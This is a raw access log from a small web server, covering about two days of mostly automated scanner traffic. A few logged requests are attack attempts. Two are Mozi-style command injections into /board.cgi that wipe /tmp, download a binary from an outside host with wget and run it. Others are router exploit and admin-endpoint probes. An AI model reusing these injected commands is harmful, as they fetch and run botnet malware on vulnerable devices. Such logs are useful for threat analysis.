nohup: ignoring input
 INFO  Accepting connections at http://localhost:8080
 HTTP  9/14/2025 4:00:16 PM 185.169.4.150 Returned 200 in 1 ms
 HTTP  9/14/2025 4:50:40 PM 45.38.44.221 GET /login
 HTTP  9/14/2025 4:50:40 PM 45.38.44.221 Returned 200 in 1 ms
 HTTP  9/14/2025 5:24:34 PM 172.68.205.163 GET /
 HTTP  9/14/2025 5:24:34 PM 172.68.205.163 Returned 200 in 1 ms
 HTTP  9/14/2025 5:24:36 PM 162.158.33.193 GET /favicon.ico
 HTTP  9/14/2025 5:24:36 PM 162.158.33.193 Returned 200 in 1 ms
 HTTP  9/14/2025 5:29:40 PM 80.82.77.202 GET /
 HTTP  9/14/2025 5:29:40 PM 80.82.77.202 Returned 200 in 1 ms
 HTTP  9/14/2025 5:37:06 PM 135.237.125.92 GET /
 HTTP  9/14/2025 5:37:06 PM 135.237.125.92 Returned 200 in 1 ms
 HTTP  9/14/2025 6:17:38 PM 185.169.4.150 GET /
 HTTP  9/14/2025 6:17:38 PM 185.169.4.150 Returned 200 in 1 ms
 HTTP  9/14/2025 6:44:16 PM 217.154.201.105 GET /cgi-bin/main-cgi?json={%22cmd%22:%20116}&_=1757416340879
 HTTP  9/14/2025 6:44:16 PM 217.154.201.105 Returned 200 in 1 ms
 HTTP  9/14/2025 7:43:55 PM 92.42.201.26 GET http://ip-api.com/json/
 HTTP  9/14/2025 7:43:55 PM 92.42.201.26 Returned 200 in 1 ms
 HTTP  9/14/2025 8:39:19 PM 123.160.223.73 GET /
 HTTP  9/14/2025 8:39:19 PM 123.160.223.73 Returned 200 in 1 ms
 HTTP  9/14/2025 8:39:20 PM 123.160.223.73 GET /
 HTTP  9/14/2025 8:39:20 PM 123.160.223.73 Returned 200 in 1 ms
 HTTP  9/14/2025 8:39:24 PM 123.160.223.74 GET /
 HTTP  9/14/2025 8:39:24 PM 123.160.223.74 Returned 200 in 1 ms
 HTTP  9/14/2025 8:39:24 PM 123.160.223.75 GET /js/chunk-vendors.0059c332.js
 HTTP  9/14/2025 8:39:24 PM 123.160.223.75 Returned 200 in 1 ms
 HTTP  9/14/2025 8:39:24 PM 123.160.223.74 GET /js/app.e2f12930.js
 HTTP  9/14/2025 8:39:24 PM 123.160.223.74 Returned 200 in 2 ms
 HTTP  9/14/2025 8:39:27 PM 123.160.223.75 GET /favicon.ico
 HTTP  9/14/2025 8:39:27 PM 123.160.223.75 Returned 200 in 1 ms
 HTTP  9/14/2025 8:39:31 PM 123.160.223.75 GET /favicon.ico
 HTTP  9/14/2025 8:39:31 PM 123.160.223.75 Returned 200 in 1 ms
 HTTP  9/14/2025 9:02:12 PM 2.236.213.178 GET /
 HTTP  9/14/2025 9:02:12 PM 2.236.213.178 Returned 200 in 1 ms
 HTTP  9/14/2025 9:32:23 PM 127.0.0.1 GET /
 HTTP  9/14/2025 9:32:23 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/14/2025 10:26:56 PM 198.235.24.8 GET /
 HTTP  9/14/2025 10:26:56 PM 198.235.24.8 Returned 200 in 1 ms
 HTTP  9/14/2025 11:15:24 PM 79.124.58.198 GET /?XDEBUG_SESSION_START=phpstorm
 HTTP  9/14/2025 11:15:24 PM 79.124.58.198 Returned 200 in 1 ms
 HTTP  9/14/2025 11:23:48 PM 45.38.44.221 POST /goform/set_LimitClient_cfg
 HTTP  9/14/2025 11:23:48 PM 45.38.44.221 Returned 200 in 6 ms
 HTTP  9/14/2025 11:35:32 PM 147.185.132.73 GET /
 HTTP  9/14/2025 11:35:32 PM 147.185.132.73 Returned 200 in 1 ms
 HTTP  9/14/2025 11:36:44 PM 91.230.168.194 GET /
 HTTP  9/14/2025 11:36:44 PM 91.230.168.194 Returned 200 in 1 ms
 HTTP  9/14/2025 11:43:33 PM 195.184.76.87 GET /favicon.ico
 HTTP  9/14/2025 11:43:33 PM 195.184.76.87 Returned 200 in 1 ms
 HTTP  9/14/2025 11:47:15 PM 91.196.152.228 GET /
 HTTP  9/14/2025 11:47:15 PM 91.196.152.228 Returned 200 in 1 ms
 HTTP  9/14/2025 11:53:06 PM 79.124.58.198 GET /actuator/gateway/routes
 HTTP  9/14/2025 11:53:06 PM 79.124.58.198 Returned 200 in 1 ms
 HTTP  9/14/2025 11:54:22 PM 45.38.44.221 POST /goform/set_LimitClient_cfg
 HTTP  9/14/2025 11:54:22 PM 45.38.44.221 Returned 200 in 1 ms
 HTTP  9/14/2025 11:54:37 PM 91.196.152.227 GET /favicon.ico
 HTTP  9/14/2025 11:54:37 PM 91.196.152.227 Returned 200 in 1 ms
 HTTP  9/14/2025 11:56:12 PM 185.247.137.156 GET /
 HTTP  9/14/2025 11:56:12 PM 185.247.137.156 Returned 200 in 1 ms
 HTTP  9/14/2025 11:56:12 PM 185.247.137.2 GET /favicon.ico
 HTTP  9/14/2025 11:56:12 PM 185.247.137.2 Returned 200 in 1 ms
 HTTP  9/15/2025 12:28:54 AM 127.0.0.1 HEAD /
 HTTP  9/15/2025 12:28:54 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/15/2025 12:28:54 AM 127.0.0.1 GET /
 HTTP  9/15/2025 12:28:54 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/15/2025 1:09:35 AM 87.236.176.172 GET /
 HTTP  9/15/2025 1:09:35 AM 87.236.176.172 Returned 200 in 1 ms
 HTTP  9/15/2025 1:09:36 AM 87.236.176.75 GET /favicon.ico
 HTTP  9/15/2025 1:09:36 AM 87.236.176.75 Returned 200 in 1 ms
 HTTP  9/15/2025 1:17:21 AM 185.169.4.150 GET /
 HTTP  9/15/2025 1:17:21 AM 185.169.4.150 Returned 200 in 1 ms
 HTTP  9/15/2025 3:04:16 AM 44.202.155.118 GET /
 HTTP  9/15/2025 3:04:16 AM 44.202.155.118 Returned 200 in 0 ms
 HTTP  9/15/2025 3:26:09 AM 45.38.44.221 GET /login
 HTTP  9/15/2025 3:26:09 AM 45.38.44.221 Returned 200 in 1 ms
 HTTP  9/15/2025 3:46:48 AM 162.243.213.233 GET /
 HTTP  9/15/2025 3:46:48 AM 162.243.213.233 Returned 200 in 1 ms
 HTTP  9/15/2025 3:46:48 AM 162.243.213.233 GET /download/powershell/
 HTTP  9/15/2025 3:46:48 AM 162.243.213.233 Returned 200 in 1 ms
 HTTP  9/15/2025 3:46:49 AM 162.243.213.233 GET /get.php
 HTTP  9/15/2025 3:46:49 AM 162.243.213.233 Returned 200 in 1 ms
 HTTP  9/15/2025 3:59:42 AM 64.62.197.182 GET /
 HTTP  9/15/2025 3:59:42 AM 64.62.197.182 Returned 200 in 1 ms
 HTTP  9/15/2025 4:00:20 AM 64.62.197.185 GET /favicon.ico
 HTTP  9/15/2025 4:00:20 AM 64.62.197.185 Returned 200 in 1 ms
 HTTP  9/15/2025 4:00:40 AM 64.62.197.186 GET http://api.ipify.org/?format=json
 HTTP  9/15/2025 4:00:40 AM 64.62.197.186 Returned 200 in 1 ms
 HTTP  9/15/2025 4:01:07 AM 64.62.197.182 GET /geoserver/web/
 HTTP  9/15/2025 4:01:07 AM 64.62.197.182 Returned 200 in 1 ms
 HTTP  9/15/2025 4:50:42 AM 127.0.0.1 GET /
 HTTP  9/15/2025 4:50:42 AM 127.0.0.1 Returned 304 in 1 ms
 HTTP  9/15/2025 4:50:42 AM 127.0.0.1 GET /js/chunk-vendors.0059c332.js
 HTTP  9/15/2025 4:50:42 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/15/2025 4:50:42 AM 127.0.0.1 GET /css/chunk-vendors.03d44498.css
 HTTP  9/15/2025 4:50:42 AM 127.0.0.1 Returned 200 in 5 ms
 HTTP  9/15/2025 4:50:42 AM 127.0.0.1 GET /css/app.74787057.css
 HTTP  9/15/2025 4:50:42 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/15/2025 4:50:42 AM 127.0.0.1 GET /js/app.e2f12930.js
 HTTP  9/15/2025 4:50:42 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/15/2025 4:50:44 AM 127.0.0.1 GET /img/LoginPage.596311b2.png
 HTTP  9/15/2025 4:50:44 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/15/2025 4:50:46 AM 127.0.0.1 GET /favicon.ico
 HTTP  9/15/2025 4:50:46 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/15/2025 4:50:48 AM 127.0.0.1 GET /
 HTTP  9/15/2025 4:50:48 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/15/2025 4:50:48 AM 127.0.0.1 GET /js/chunk-vendors.0059c332.js
 HTTP  9/15/2025 4:50:48 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/15/2025 4:50:48 AM 127.0.0.1 GET /js/app.e2f12930.js
 HTTP  9/15/2025 4:50:48 AM 127.0.0.1 GET /css/app.74787057.css
 HTTP  9/15/2025 4:50:48 AM 127.0.0.1 GET /css/chunk-vendors.03d44498.css
 HTTP  9/15/2025 4:50:48 AM 127.0.0.1 Returned 200 in 7 ms
 HTTP  9/15/2025 4:50:48 AM 127.0.0.1 Returned 200 in 7 ms
 HTTP  9/15/2025 4:50:48 AM 127.0.0.1 Returned 200 in 8 ms
 HTTP  9/15/2025 4:50:50 AM 127.0.0.1 GET /img/LoginPage.596311b2.png
 HTTP  9/15/2025 4:50:50 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/15/2025 4:51:51 AM 185.169.4.150 GET /
 HTTP  9/15/2025 4:51:51 AM 185.169.4.150 Returned 200 in 1 ms
 HTTP  9/15/2025 5:36:18 AM 71.6.232.30 GET /
 HTTP  9/15/2025 5:36:18 AM 71.6.232.30 Returned 200 in 1 ms
 HTTP  9/15/2025 6:06:02 AM 68.183.182.150 GET /
 HTTP  9/15/2025 6:06:02 AM 68.183.182.150 Returned 200 in 1 ms
 HTTP  9/15/2025 6:06:02 AM 68.183.182.150 GET /download/powershell/
 HTTP  9/15/2025 6:06:02 AM 68.183.182.150 Returned 200 in 0 ms
 HTTP  9/15/2025 6:06:02 AM 68.183.182.150 GET /get.php
 HTTP  9/15/2025 6:06:02 AM 68.183.182.150 Returned 200 in 1 ms
 HTTP  9/15/2025 6:30:32 AM 205.210.31.139 GET /
 HTTP  9/15/2025 6:30:32 AM 205.210.31.139 Returned 200 in 1 ms
 HTTP  9/15/2025 6:39:42 AM 176.65.149.165 POST /goform/set_LimitClient_cfg
 HTTP  9/15/2025 6:39:42 AM 176.65.149.165 Returned 200 in 1 ms
 HTTP  9/15/2025 6:55:32 AM 216.180.246.58 GET /
 HTTP  9/15/2025 6:55:32 AM 216.180.246.58 Returned 200 in 1 ms
 HTTP  9/15/2025 6:56:07 AM 216.180.246.58 GET /
 HTTP  9/15/2025 6:56:07 AM 216.180.246.58 Returned 200 in 1 ms
 HTTP  9/15/2025 6:59:25 AM 216.180.246.58 GET /favicon.ico
 HTTP  9/15/2025 6:59:25 AM 216.180.246.58 Returned 200 in 1 ms
 HTTP  9/15/2025 7:06:03 AM 3.131.215.38 GET /
 HTTP  9/15/2025 7:06:03 AM 3.131.215.38 Returned 200 in 1 ms
 HTTP  9/15/2025 7:06:12 AM 147.185.132.100 GET /
 HTTP  9/15/2025 7:06:12 AM 147.185.132.100 Returned 200 in 1 ms
 HTTP  9/15/2025 7:08:08 AM 3.131.215.38 GET /
 HTTP  9/15/2025 7:08:08 AM 3.131.215.38 Returned 200 in 1 ms
 HTTP  9/15/2025 9:00:46 AM 167.94.138.125 GET /
 HTTP  9/15/2025 9:00:46 AM 167.94.138.125 Returned 200 in 1 ms
 HTTP  9/15/2025 9:15:07 AM 27.193.197.117 POST /GponForm/diag_Form?images/
 HTTP  9/15/2025 9:15:07 AM 27.193.197.117 Returned 200 in 1 ms
 HTTP  9/15/2025 10:08:30 AM 185.169.4.150 GET /
 HTTP  9/15/2025 10:08:30 AM 185.169.4.150 Returned 200 in 1 ms
 HTTP  9/15/2025 10:24:08 AM 130.211.53.197 GET /
 HTTP  9/15/2025 10:24:08 AM 130.211.53.197 Returned 200 in 1 ms
 HTTP  9/15/2025 11:52:33 AM 185.247.137.21 GET /
 HTTP  9/15/2025 11:52:33 AM 185.247.137.21 Returned 200 in 2 ms
 HTTP  9/15/2025 11:52:34 AM 87.236.176.223 GET /favicon.ico
 HTTP  9/15/2025 11:52:34 AM 87.236.176.223 Returned 200 in 1 ms
 HTTP  9/15/2025 1:02:41 PM 45.156.87.179 GET /
 HTTP  9/15/2025 1:02:41 PM 45.156.87.179 Returned 200 in 1 ms
 HTTP  9/15/2025 1:57:19 PM 185.169.4.150 GET /
 HTTP  9/15/2025 1:57:19 PM 185.169.4.150 Returned 200 in 1 ms
 HTTP  9/15/2025 2:34:42 PM 40.124.175.174 GET /
 HTTP  9/15/2025 2:34:42 PM 40.124.175.174 Returned 200 in 1 ms
 HTTP  9/15/2025 2:49:26 PM 176.65.149.165 POST /goform/set_LimitClient_cfg
 HTTP  9/15/2025 2:49:26 PM 176.65.149.165 Returned 200 in 0 ms
 HTTP  9/15/2025 3:35:22 PM 167.94.138.55 GET /
 HTTP  9/15/2025 3:35:22 PM 167.94.138.55 Returned 200 in 1 ms
 HTTP  9/15/2025 3:35:29 PM 167.94.138.55 GET /
 HTTP  9/15/2025 3:35:29 PM 167.94.138.55 Returned 200 in 1 ms
 HTTP  9/15/2025 3:35:31 PM 167.94.138.55 GET /favicon.ico
 HTTP  9/15/2025 3:35:31 PM 167.94.138.55 Returned 200 in 1 ms
 HTTP  9/15/2025 3:35:43 PM 167.94.138.55 GET /favicon.ico
 HTTP  9/15/2025 3:35:43 PM 167.94.138.55 Returned 200 in 1 ms
 HTTP  9/15/2025 3:35:46 PM 167.94.138.55 GET /.well-known/security.txt
 HTTP  9/15/2025 3:35:46 PM 167.94.138.55 Returned 200 in 1 ms
 HTTP  9/15/2025 6:44:03 PM 185.169.4.150 GET /
 HTTP  9/15/2025 6:44:03 PM 185.169.4.150 Returned 200 in 1 ms
 HTTP  9/15/2025 7:27:23 PM 115.48.136.147 GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://115.48.136.147:54641/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron
 HTTP  9/15/2025 7:27:23 PM 115.48.136.147 Returned 200 in 1 ms
 HTTP  9/15/2025 8:25:55 PM 198.235.24.156 GET /
 HTTP  9/15/2025 8:25:55 PM 198.235.24.156 Returned 200 in 1 ms
 HTTP  9/15/2025 8:33:15 PM 196.251.86.125 GET /login
 HTTP  9/15/2025 8:33:15 PM 196.251.86.125 Returned 200 in 1 ms
 HTTP  9/15/2025 9:23:17 PM 112.46.213.185 GET /
 HTTP  9/15/2025 9:23:17 PM 112.46.213.185 Returned 200 in 1 ms
 HTTP  9/15/2025 9:42:30 PM 205.210.31.225 GET /
 HTTP  9/15/2025 9:42:30 PM 205.210.31.225 Returned 200 in 1 ms
 HTTP  9/15/2025 10:09:53 PM 98.80.4.74 GET /
 HTTP  9/15/2025 10:09:53 PM 98.80.4.74 Returned 200 in 1 ms
 HTTP  9/15/2025 10:09:53 PM 98.80.4.74 GET /favicon.ico
 HTTP  9/15/2025 10:09:53 PM 98.80.4.74 Returned 200 in 1 ms
 HTTP  9/15/2025 11:40:57 PM 134.0.101.159 GET /
 HTTP  9/15/2025 11:40:57 PM 134.0.101.159 Returned 200 in 1 ms
 HTTP  9/15/2025 11:47:50 PM 185.169.4.150 GET /
 HTTP  9/15/2025 11:47:50 PM 185.169.4.150 Returned 200 in 1 ms
 HTTP  9/15/2025 11:49:15 PM 87.236.176.152 GET /
 HTTP  9/15/2025 11:49:15 PM 87.236.176.152 Returned 200 in 1 ms
 HTTP  9/15/2025 11:49:16 PM 87.236.176.48 GET /favicon.ico
 HTTP  9/15/2025 11:49:16 PM 87.236.176.48 Returned 200 in 1 ms
 HTTP  9/15/2025 11:56:42 PM 79.124.58.198 GET /?XDEBUG_SESSION_START=phpstorm
 HTTP  9/15/2025 11:56:42 PM 79.124.58.198 Returned 200 in 1 ms
 HTTP  9/16/2025 12:13:53 AM 176.65.149.162 POST /goform/set_LimitClient_cfg
 HTTP  9/16/2025 12:13:53 AM 176.65.149.162 Returned 200 in 1 ms
 HTTP  9/16/2025 12:33:59 AM 79.124.58.198 GET /actuator/gateway/routes
 HTTP  9/16/2025 12:33:59 AM 79.124.58.198 Returned 200 in 1 ms
 HTTP  9/16/2025 12:47:02 AM 205.210.31.177 GET /
 HTTP  9/16/2025 12:47:02 AM 205.210.31.177 Returned 200 in 1 ms
 HTTP  9/16/2025 12:52:31 AM 9.234.10.188 GET /hudson
 HTTP  9/16/2025 12:52:31 AM 9.234.10.188 Returned 200 in 1 ms
 HTTP  9/16/2025 12:53:21 AM 196.251.72.26 HEAD /
 HTTP  9/16/2025 12:53:21 AM 196.251.72.26 Returned 200 in 1 ms
 HTTP  9/16/2025 12:53:24 AM 196.251.72.26 GET /
 HTTP  9/16/2025 12:53:24 AM 196.251.72.26 Returned 200 in 1 ms
 HTTP  9/16/2025 12:53:24 AM 196.251.72.26 GET /js/chunk-vendors.0059c332.js
 HTTP  9/16/2025 12:53:24 AM 196.251.72.26 Returned 200 in 1 ms
 HTTP  9/16/2025 12:53:28 AM 196.251.72.26 GET /js/app.e2f12930.js
 HTTP  9/16/2025 12:53:28 AM 196.251.72.26 Returned 200 in 1 ms
 HTTP  9/16/2025 1:17:07 AM 205.210.31.140 GET /
 HTTP  9/16/2025 1:17:07 AM 205.210.31.140 Returned 200 in 1 ms
 HTTP  9/16/2025 2:04:57 AM 147.185.132.118 GET /
 HTTP  9/16/2025 2:04:57 AM 147.185.132.118 Returned 200 in 1 ms
 HTTP  9/16/2025 2:17:57 AM 192.159.99.162 GET /
 HTTP  9/16/2025 2:17:57 AM 192.159.99.162 Returned 200 in 1 ms
 HTTP  9/16/2025 2:45:20 AM 45.38.44.221 GET /login
 HTTP  9/16/2025 2:45:20 AM 45.38.44.221 Returned 200 in 0 ms
 HTTP  9/16/2025 2:49:21 AM 172.69.90.227 GET /
 HTTP  9/16/2025 2:49:21 AM 172.69.90.227 Returned 200 in 1 ms
 HTTP  9/16/2025 5:26:06 AM 120.57.160.67 GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron
 HTTP  9/16/2025 5:26:06 AM 120.57.160.67 Returned 200 in 1 ms
 HTTP  9/16/2025 5:29:05 AM 167.71.179.75 GET /
 HTTP  9/16/2025 5:29:05 AM 167.71.179.75 Returned 200 in 1 ms
 HTTP  9/16/2025 5:29:05 AM 167.71.179.75 GET /download/powershell/
 HTTP  9/16/2025 5:29:05 AM 167.71.179.75 Returned 200 in 1 ms
 HTTP  9/16/2025 5:29:06 AM 167.71.179.75 GET /get.php
 HTTP  9/16/2025 5:29:06 AM 167.71.179.75 Returned 200 in 1 ms
 HTTP  9/16/2025 5:52:10 AM 54.221.2.44 GET /
 HTTP  9/16/2025 5:52:10 AM 54.221.2.44 Returned 200 in 1 ms
 HTTP  9/16/2025 6:25:58 AM 172.69.138.6 GET /
 HTTP  9/16/2025 6:25:58 AM 172.69.138.6 Returned 200 in 1 ms

 INFO  Gracefully shutting down. Please wait...
